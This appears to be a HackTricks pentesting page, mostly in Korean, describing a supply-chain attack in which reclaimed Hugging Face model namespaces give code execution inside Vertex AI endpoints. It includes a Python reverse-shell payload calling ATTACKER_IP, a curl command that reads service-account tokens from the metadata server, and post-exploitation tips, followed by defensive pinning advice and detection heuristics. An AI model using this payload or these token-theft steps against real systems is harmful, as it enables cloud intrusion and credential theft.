# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 시나리오

- Vertex AI Model Garden은 많은 Hugging Face (HF) 모델을 직접 배포할 수 있게 합니다.
- HF 모델 식별자는 Author/ModelName입니다. HF에서 author/org가 삭제되면 동일한 author 이름은 누구나 다시 등록할 수 있습니다. 공격자는 그런 뒤 동일한 ModelName으로 레거시 경로에 repo를 생성할 수 있습니다.
- 이름만으로 가져오는 Pipelines, SDKs, 또는 cloud catalogs(pinning/integrity 없음)는 공격자가 제어하는 repo를 내려받습니다. 모델이 배포되면 해당 repo의 loader 코드가 Vertex AI endpoint 컨테이너 내에서 실행되어 endpoint의 권한으로 RCE를 얻을 수 있습니다.

Two common takeover cases on HF:
- Ownership deletion: Old path 404 until someone re-registers the author and publishes the same ModelName.
- Ownership transfer: HF issues 307 redirects from old Author/ModelName to the new author. If the old author is later deleted and re-registered by an attacker, the redirect chain is broken and the attacker’s repo serves at the legacy path.

## 재사용 가능한 네임스페이스(HF) 식별

- 이전 author가 삭제된 경우: author 페이지는 404를 반환합니다; 모델 경로는 takeover가 일어날 때까지 404를 반환할 수 있습니다.
- 이전된 모델: 이전 모델 경로는 기존 author가 존재하는 동안 새 소유자에게 307을 보냅니다. 이후 이전 author가 삭제되고 재등록되면 레거시 경로는 공격자의 repo로 해석됩니다.

curl로 빠르게 확인:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI에 대한 종단 간 공격 흐름

1) Model Garden이 배포 가능(deployable)으로 표시한 재사용 가능한 모델 네임스페이스를 발견한다:
- Vertex AI Model Garden에서 여전히 “verified deployable”로 표시되는 HF 모델을 찾는다.
- 원저자가 삭제되었는지, 또는 모델이 이전되어 이전 저자가 이후에 제거되었는지 HF에서 확인한다.

2) 삭제된 저자를 HF에 재등록하고 동일한 ModelName을 재생성한다.

3) 악성 repo를 게시한다. 모델 로드 시 실행되는 코드를 포함시킨다. HF 모델 로드 중 일반적으로 실행되는 예시:
- repo의 __init__.py에서의 부작용
- config/auto_map에서 참조되는 사용자 정의 modeling_*.py 또는 processing 코드
- Transformers pipelines에서 trust_remote_code=True를 요구하는 코드 경로

4) 구형 Author/ModelName으로 배포된 Vertex AI가 이제 공격자 repo를 끌어온다. 로더는 Vertex AI endpoint 컨테이너 내부에서 실행된다.

5) 페이로드는 endpoint 환경에서 (RCE)를 통해 endpoint의 권한으로 접근을 확보한다.

예시 페이로드 조각 (import 시 실행, 데모용):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
참고
- 실제 환경의 로더는 다양합니다. 많은 Vertex AI HF integrations는 모델의 config에서 참조되는 repo 모듈을 clone하고 import하는데(예: auto_map), 이는 코드 실행을 유발할 수 있습니다. 일부 사용 사례는 trust_remote_code=True를 요구합니다.
- 해당 endpoint는 일반적으로 제한된 범위의 전용 container에서 실행되지만, 데이터 접근 및 GCP 내 횡적 이동을 위한 유효한 초기 발판이 될 수 있습니다.

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- credentials/tokens 확보를 위해 environment variables 및 metadata 열거
- 연결된 storage 또는 마운트된 model artifacts에 접근
- service account identity를 통해 Google APIs(Document AI, Storage, Pub/Sub 등)와 상호작용
- 플랫폼이 repo를 재풀(re-pull)할 경우 model artifact에 persistence 확보

접근 가능하면 instance metadata를 열거하세요 (container dependent):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI 사용자를 위한 방어 지침

- HF loaders에서 commit별로 모델을 고정(Pin)하여 무단 교체를 방지하세요:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 검증된 HF 모델을 신뢰할 수 있는 내부 아티팩트 스토어/레지스트리로 미러링하고 거기서 배포하세요.
- 코드베이스와 설정을 지속적으로 스캔하여 삭제되었거나 이전된 하드코딩된 Author/ModelName을 찾아 새 네임스페이스로 업데이트하거나 커밋으로 고정하세요.
- Model Garden에서 배포 전에 모델 출처와 저자 존재 여부를 확인하세요.

## 탐지 휴리스틱 (HTTP)

- 삭제된 저자: 저자 페이지 404; 레거시 모델 경로는 계정 탈취 전까지 404.
- 이전된 모델: 기존 저자가 존재하는 동안 레거시 경로가 새 저자로 307 리다이렉트됨; 만약 기존 저자가 나중에 삭제되고 재등록되면 레거시 경로가 공격자 콘텐츠를 제공함.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 교차 참조

- 더 광범위한 방법론 및 공급망 관련 노트를 참조하세요:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 참고자료

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
